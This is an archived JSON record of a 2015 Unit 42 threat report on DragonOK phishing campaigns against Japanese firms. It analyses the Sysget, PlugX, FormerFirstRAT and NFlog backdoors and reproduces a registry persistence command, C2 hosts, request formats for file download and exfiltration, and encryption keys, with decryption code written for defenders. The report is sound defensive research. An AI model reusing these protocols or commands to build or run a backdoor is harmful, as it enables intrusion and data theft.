{
    "id": "3fb58e61-23da-4301-8f44-eee7fa192f37",
    "created_at": "2023-01-12T14:59:31.707306Z",
    "updated_at": "2025-03-27T02:16:06.766242Z",
    "deleted_at": null,
    "sha1_hash": "6673d2db0c28b5c7604f9c4860f789449e26dc2e",
    "title": "2015-04-14 - Unit 42 Identifies New DragonOK Backdoor Malware Deployed Against Japanese Targets",
    "authors": "",
    "file_creation_date": "2022-05-28T16:07:27Z",
    "file_modification_date": "2022-05-28T16:07:27Z",
    "file_size": 378960,
    "plain_text": "# Unit 42 Identifies New DragonOK Backdoor Malware Deployed Against Japanese Targets\n\n**[unit42.paloaltonetworks.com/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/](https://unit42.paloaltonetworks.com/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/)**\n\nJen Miller-Osborn, Josh Grunzweig April 14, 2015\n\nBy [Jen Miller-Osborn and](https://unit42.paloaltonetworks.com/author/jen-miller-osborn/) [Josh Grunzweig](https://unit42.paloaltonetworks.com/author/joshgruznweig/)\n\nApril 14, 2015 at 1:31 PM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Threat Advisory/Analysis,](https://unit42.paloaltonetworks.com/category/threat-briefs-assessments/threat-advisory-analysis/) [Threat Prevention,](https://unit42.paloaltonetworks.com/category/threat-prevention-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [AutoFocus,](https://unit42.paloaltonetworks.com/tag/autofocus/) [DragonOK,](https://unit42.paloaltonetworks.com/tag/dragonok/) [FormerFirstRAT,](https://unit42.paloaltonetworks.com/tag/formerfirstrat/) [HelloBridge,](https://unit42.paloaltonetworks.com/tag/hellobridge/) [Japan,](https://unit42.paloaltonetworks.com/tag/japan/) [NewCT,](https://unit42.paloaltonetworks.com/tag/newct/) [NFlog,](https://unit42.paloaltonetworks.com/tag/nflog/) [PlugX,](https://unit42.paloaltonetworks.com/tag/plugx/) [PoisonIvy,](https://unit42.paloaltonetworks.com/tag/poisonivy/) [Sysget](https://unit42.paloaltonetworks.com/tag/sysget/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/)\n\n## Summary\n\n[Palo Alto Networks Unit 42 used the AutoFocus threat intelligence service to identify a series of phishing attacks against Japanese](http://media.paloaltonetworks.com/lp/autofocus/)\norganizations. Using AutoFocus to quickly search and correlate artifacts across the collective set of WildFire and other Palo Alto Networks\nthreat intelligence, we were able to associate the attacks with the group publicly known as “DragonOK.” [1] These attacks took place between\nJanuary and March of 2015.\n\nDragonOK has previously targeted Japanese high-tech and manufacturing firms, but we’ve identified a new backdoor malware, named\n“FormerFirstRAT,” deployed by these attackers. See the “Malware Details” section for analysis of the three RATs and two additional backdoors\ndeployed in this persistent attack campaign.\n\n## Campaign Details\n\nThis campaign involved five separate phishing attacks, each carrying a different variant of Sysget malware, also known as HelloBridge. The\nmalware was included as an attachment intended to trick the user into opening the malware. This included altering the icon of the executable\nto appear as other file types (Figure 1) as well as decoy documents to trick users into thinking they had opened a legitimate file.\n\n**Figure 1. Icons used by malicious Sysget attachments.**\n\nAll of the Sysget files used in this campaign communicate with a single command and control (C2) server, hosted at biosnews[.]info. Sysget\ncommunicates with this server using the HTTP protocol; see the Malware Details section for specifics of the command and control traffic. All\nfive phishing campaigns targeted a Japanese manufacturing firm over the course of two months, but the final campaign also targeted a\nseparate Japanese high-tech organization. (Figure 2)\n\n\n-----\n\n**gu e** **e Sysget sa** **p es used to ta get t o Japa ese o ga** **at o s**\n\nFour of the five Sysget variants included a form of decoy document to trick users into believing they had opened a legitimate file rather than\nmalware. Two of the executables used decoy documents that included information about obituaries. Figure 3 shows a GIF file containing an\nobituary notice for a woman, while Figure 4 shows a Microsoft Word document containing the obituary of a man.\n\n**Figure 3. Japanese decoy document containing an obituary notice for a woman.**\n\n**Figure 4. Japanese decoy document containing an obituary notice for a woman.**\n\nThe Sysget sample with a PDF icon created a second executable, named Adobe.exe, which simply displayed the following warning.\n\n**Figure 5. Error message generated by Adobe.exe**\n\nThe final Sysget sample used a Microsoft Excel icon and opened an Excel document that contained cells filled with “XXXXXX.” (Figure 6)\n\n\n-----\n\n**Figure 6. Excel spreadsheet with Xs in multiple rows and columns.**\n\nThese Sysget variants appear to be a first stage payload in these attacks. During analysis of this threat, we identified five additional backdoor\ntools hosted on biosnews[.]info which may be downloaded by the Sysget variants once the attackers have established a foothold.\n\nThree of the backdoors, NFlog, PoisonIvy, and NewCT have previously been publicly associated with DragonOK. Additionally, the actors have\nnow added the popular PlugX backdoor to their toolkit. An additional backdoor appears to be a new, custom-built tool, which we have not\npreviously associated with DragonOK or any other attack group. We’ve named this tool “FormerFirstRAT” as it appears to be the names used\nby the developers to refer to their creations. Figure 7 shows the relationship between these backdoors and their respective command and\ncontrol servers.\n\n\n-----\n\n**Figure 7. Relationship between five additional backdoors used by DragonOK and their C2 servers in this campaign.**\n\nThe following section details the functionality of the malware deployed in this campaign.\n\n## Malware Details\n\n**Sysget/HelloBridge**\n\nIn this campaign, Sysget samples were attached to e-mails and used various icons to trick users into infecting their systems. The majority of\nthese samples are self-extracting executables that contain both a malicious downloader, along with a legitimate file. When the self-extracting\nexecutable is launched, the downloader and legitimate file are typically dropped in one of the following directories and then executed:\n\n%PROGRAMFILES%\n%WINDIR%\\Temp\n\nWhen the malicious downloader is executed, it begins by creating the 'mcsong[]' event in order to ensure one instance is running. It then\nspawns a new instance of 'C:\\\\windows\\\\system32\\\\cmd.exe' with a window name of 'Chrome-Update'. It attempts to obtain a handle to this\nwindow using the FindWindowW API call and then proceeds to send the following command to this executable. This allows the malware to\nindirectly execute a command within the cmd.exe process.\n\n1 reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v netshare /f /d %temp%\\notilv.exe /t REG_EXPAND_SZ\n\nThis registry key will ensure an executable that it later downloads is configured to persist across reboots. It then sends the 'exit' command to\nthis executable, which will kill this particular process.\n\nThe malware then attempts to read the following file. This file is used to store a key that is later used to decrypt data received during network\ncommunications.\n\n%temp%\\ibmCon6.tmp\n\nIf the file does not exist, it will make the following GET request:\n\n\n1\n2\n3\n4\n5\n6\n\n\nGET /index.php?fn=s4&name=4890c2d546fa48a536b75b48b17de023\nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews[.]info\nConnection: Keep-Alive\n\n\nThe filename and name parameters are statically set in the above request. The server responds with data similar to the following:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nHTTP/1.1 200 OK\nDate: Wed, 11 Mar 2015 00:14:14 GMT\nServer: Apache/2.4.12 (Unix) OpenSSL/1.0.1e-fips\nmod_bwlimited/1.4 mod_fcgid/2.3.10-dev\nX-Powered-By: PHP/5.4.37\nKeep-Alive: timeout=5\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: text/html\n17\ngh204503254\n1916733707\n0\n\n\nThe first two pieces of data ('17' and 'gh204503254') are then written to the ibmCon6.tmp file referenced earlier.\n\nThe malware will copy itself to the %TEMP% directory with the executable name of 'notilv.exe'. Due to the previously written registry key, this\nfile will execute when the machine is restarted and the current user logs in.\n\nThe malware then makes the following request:\n\n\n1\n2\n3\n4\n5\n6\n\n\nGET /index.php?fn=s1&uid=fc1a8359e0f4cb8d60920dc066b8b21c\nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews[.]info\nConnection: Keep-Alive\n\n\nThe filename and uid parameters are statically set in the above request. The response data is decrypted using the RC4 cryptographic stream\ncipher. The 'gh204503254' data that was previously downloaded is used as the key. The following Python code can be used for decryption,\nusing the 'gh204503254' key:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nfrom wincrypto import CryptCreateHash, CryptHashData,\nCryptDeriveKey, CryptDecrypt\nCALG_RC4 = 0x6801\nCALG_MD5 = 0x8003\nmd5_hasher = CryptCreateHash(CALG_MD5)\nCryptHashData(md5_hasher, 'gh204503254')\nrc4_key = CryptDeriveKey(md5_hasher, CALG_RC4)\ndecrypted_data = CryptDecrypt(rc4_key, final_data)\npp.pprint(decrypted_data)\n\n\nAt this stage, the remote server can send a number of different responses. The following example response will instruct the malware to\ndownload a remote executable file:\n\n1 sys getinto \"filename.exe\" \"01234567890123456789012345678901\";\\n\n\n'filename.exe' is the path where the downloaded file will be stored, and '01234567890123456789012345678901' is the value supplied in the\nsubsequent HTTP request. When this command is received, the following example request is made:\n\n\n1\n2\n3\n4\n5\n6\n\n\nGET /index.php?fn=s3&file=01234567890123456789012345678901\nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews[.]info\nConnection: Keep-Alive\n\n\nAt this point, the remote server will respond with an unencrypted file that the malware saves to the system.\n\nThe remote server can also send the following example response. This response will instruct the malware to upload the specified file:\n\n1 sys upto \"filename.exe\";\\n\n\nAn example upload request can be seen below:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\nPOST /index.php?fn=s2&item=70efdf2ec9b086079795c442636b55fb\nHTTP/1.1\nAccept: text/html, application/xhtml+xml, */*\nContent-Type: multipart/form-data; boundary=---------------------------d5340oqbasdfaa\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews[.]info\nContent-Length: 115126\nConnection: Keep-Alive\n-----------------------------d5340oqbasdfaa\nContent-Disposition: form-data; name=\"file\";\nfilename=\"calc_malware.exe\"\nContent-Type: application/octet-stream\n\n[BINARY_DATA]\n-----------------------------d5340oqbasdfaa\nContent-Disposition: form-data; name=\"path\"\n70efdf2ec9b086079795c442636b55fb\n-----------------------------d5340oqbasdfaa\nContent-Disposition: form-data; name=\"submit\"\nSubmit\n-----------------------------d5340oqbasdfaa-\n\nThe remote server can also send the following example response. This response will instruct the malware to execute the given command:\n\n1 [command];\\n\n\nThe results of this -execution are stored in a temporary text file in the %TEMP% directory. These results are encrypted using the same\ntechnique mentioned previously. An example upload of these results can be seen below:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nPOST /index.php?fn=s2 HTTP/1.1\nAccept: text/html, application/xhtml+xml, */*\nContent-Type: multipart/form-data; boundary=---------------------------d5340oqbasdfaa\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;\nTrident/6.0)\nHost: biosnews[.]info\nContent-Length: 1609\nConnection: Keep-Alive\n-----------------------------d5340oqbasdfaa\nContent-Disposition: form-data; name=\"file\";\nfilename=\"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\.txt\"\nContent-Type: application/octet-stream\n\n[BINARY_DATA]\n-----------------------------d5340oqbasdfaa\nContent-Disposition: form-data; name=\"path\"\n70efdf2ec9b086079795c442636b55fb\n-----------------------------d5340oqbasdfaa\nContent-Disposition: form-data; name=\"submit\"\nSubmit\n-----------------------------d5340oqbasdfaa—\n\n\n**PlugX**\n\nPlugX is a backdoor that is often used by actors in targeted attacks. This version of PlugX attempts to disguise itself as a Symantec product.\nThe following icon is present in this sample:\n\n**Figure 8. PlugX file uses Symantec logo icon.**\n\nUpon execution, the malware will install itself as a service with the following parameters:\n\n\n-----\n\n**Service Name** RasTls\n\n**Service Display Name** RasTls\n\n**Service Description** Symantec 802.1x Supplicant\n\nIt may also set the following registry key for persistence:\n\n1 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RasTls - %windir%\\system32\\svchost.exe\n\nPlugX is a well-studied malware family with a long history of use in targeted attacks. More information on its history is available at the following\nlinks.\n\n**FormerFirstRAT**\n\nThis remote administration tool (RAT) is referred to as “FormerFirstRAT” by its authors. FormerFirstRAT communicates using unencrypted\nHTTP over port 443; the use of mismatching ports and communication protocols is not uncommon in targeted attack campaigns. In addition,\nport / protocol mis-match traffic can be an indicator of bad activity.\n\nWhen the malware starts, it writes the following registry key to ensure persistence:\n\n1 [HKCU|HKLM]\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WmdmPmSp -> EXE of DLL\n\nThe malware then proceeds to send an HTTP POST request with information about the victim system. The following information is collected:\n\nVictim IP address\nUsername\nAdministrative privileges\nRAT status (active/sleep)\nRAT version (in this case, 0.8)\nMicrosoft Windows version\nUserID (Volume Serial followed by an underscore and a series of '1's)\nLanguage\n\nThe following settings are used for command and control:\n\n\n1\n2\n3\n4\n\n\nHostname: https.reweblink.com\nPort: 443\nTimer: 180000\nMethod: POST\n\n\nThe malware encrypts network communication using the AES128 encryption cipher. It uses the MD5 of 'tucwatkins' in order to generate the\nkey. All data is sent via HTTP POST requests. While not a distinct TTP, the author of this malware may be a soap-opera fan. The following\ncode demonstrates how you can decrypt the malware communications using Python:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nfrom wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptEncrypt, CryptDecrypt\nCALG_AES_128 = 0x660e\nCALG_MD5 = 0x8003\ndata = \"...\" # Encrypted Data\nmd5_hasher = CryptCreateHash(CALG_MD5)\nCryptHashData(md5_hasher, 'tucwatkins')\naes_key = CryptDeriveKey(md5_hasher, CALG_AES_128)\ndecrypted_data = CryptDecrypt(aes_key, data)\n\n\nThe malware then enters a loop where it will send out periodic requests to the remote server. The remote server has the ability to respond and\nprovide instructions to the RAT. We have identified the following functionalities:\n\nModify sleep timer between requests\nExecute a command and return the command output\nBrowse the file system\nDownload files\nDelete files\nExfiltrate victim information\n\nAn example HTTP POST request can be seen below.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nPOST / HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;\n.NET CLR 1.1.4322)\nHost: https.reweblink.com:443\nContent-Length: 48\nCache-Control: no-cache\n\n[encrypted binary data]\n\n\n**NFlog**\n\nWhen loaded inside of a running process, NFlog begins by spawning a new thread. This new thread is responsible for all malicious activities\nproduced by this DLL. Initially, the malware will set the following registry key:\n\n1 HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\update : [current_executable_filename]\n\nWhere [current_executable_filename] is the path to the current running executable, which is acquired via a call to GetModuleFileNameA. This\nregistry key ensures that the malware will persist across reboots when the current user logs in.\n\nMultiple string obfuscation routines are included in this malware sample. Strings contained in the binary are decrypted via a simple binary XOR\nagainst a single byte key of 0x25.\n\nThe malware proceeds to create a named event object of 'GoogleZCM' and uses this event in order to ensure only one instance of this\nmalware is running at a given time.\n\nThe malware proceeds to make an attempt at binding to the local host on port 1139.\n\nThe malware attempts to ensure Internet connectivity by making a request to www.microsoft.com. An example request is shown below.\n\n\n1\n2\n3\n4\n5\n6\n\n\nGET / HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 7.0;Windows NT 5.1)\nHost: www.microsoft.com\nCache-Control: no-cache\nCookie: WT_NVR=0=/:1=genuine:2=genuine/validate; MC1=GUID=aa8ac5ed26b9bf4f8d3bd1b2dcaa82f6&HASH=edc5&LV=201503&V=4&LU\nfd8c6b7df7c3:lv=1427375812454:ss=1427375780673;\noptimizelySegments=%7B%222130980600%22%3A%22true%22%2C%222098371093%22%3A%22true%22%2C%22223040836%22%3A%\noptimizelyEndUserId=oeu1427379528348r0.49006120319115387; MUID=07660815420F6D5B2DCC0F63434A6C60\n%3\n\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-04-14 - Unit 42 Identifies New DragonOK Backdoor Malware Deployed Against Japanese Targets.pdf"
    ],
    "report_names": [
        "2015-04-14 - Unit 42 Identifies New DragonOK Backdoor Malware Deployed Against Japanese Targets.pdf"
    ],
    "threat_actors": [
        {
            "id": "5ffe400c-6025-44c2-9aa1-7c34a7a192b0",
            "created_at": "2023-01-06T13:46:38.469688Z",
            "updated_at": "2025-03-27T02:00:02.84172Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Moafee",
                "BRONZE OVERBROOK",
                "G0017",
                "G0002",
                "Shallow Taurus"
            ],
            "source_name": "MISPGALAXY:DragonOK",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7ebda3c6-1789-4d84-97cf-47fb18a0cb28",
            "created_at": "2022-10-25T15:50:23.78829Z",
            "updated_at": "2025-03-27T02:00:55.547275Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "DragonOK"
            ],
            "source_name": "MITRE:DragonOK",
            "tools": [
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "60d9c778-488b-459e-a2f6-9e48c607ba45",
            "created_at": "2022-10-25T16:47:55.606462Z",
            "updated_at": "2025-03-27T02:05:17.281676Z",
            "deleted_at": null,
            "main_name": "BRONZE OVERBROOK",
            "aliases": [
                "DragonOK ",
                "Samurai Panda ",
                "Temp.DragonOK ",
                "Danti "
            ],
            "source_name": "Secureworks:BRONZE OVERBROOK",
            "tools": [
                " DDKONG",
                " HelloBridge",
                " IsSpace",
                " NFLog Trojan",
                " PLAINTEE",
                " PlugX",
                " Rambo",
                "Aveo"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "340d1673-0678-4e1f-8b75-30da2f65cc80",
            "created_at": "2022-10-25T16:07:23.552036Z",
            "updated_at": "2025-03-27T02:02:09.85925Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Bronze Overbrook",
                "Shallow Taurus"
            ],
            "source_name": "ETDA:DragonOK",
            "tools": [
                "Agent.dhwf",
                "CT",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Gen:Trojan.Heur.PT",
                "HTran",
                "HUC Packet Transmit Tool",
                "HelloBridge",
                "IsSpace",
                "KHRAT",
                "Kaba",
                "Korplug",
                "Mongall",
                "NFlog",
                "NewCT",
                "NfLog RAT",
                "PlugX",
                "Poison Ivy",
                "Rambo",
                "RedDelta",
                "SPIVY",
                "Sogu",
                "SysGet",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "TidePool",
                "Xamtrav",
                "brebsd",
                "ffrat",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535571,
    "ts_updated_at": 1743041766,
    "ts_creation_date": 1653754047,
    "ts_modification_date": 1653754047,
    "files": {
        "pdf": "https://archive.orkl.eu/6673d2db0c28b5c7604f9c4860f789449e26dc2e.pdf",
        "text": "https://archive.orkl.eu/6673d2db0c28b5c7604f9c4860f789449e26dc2e.txt",
        "img": "https://archive.orkl.eu/6673d2db0c28b5c7604f9c4860f789449e26dc2e.jpg"
    }
}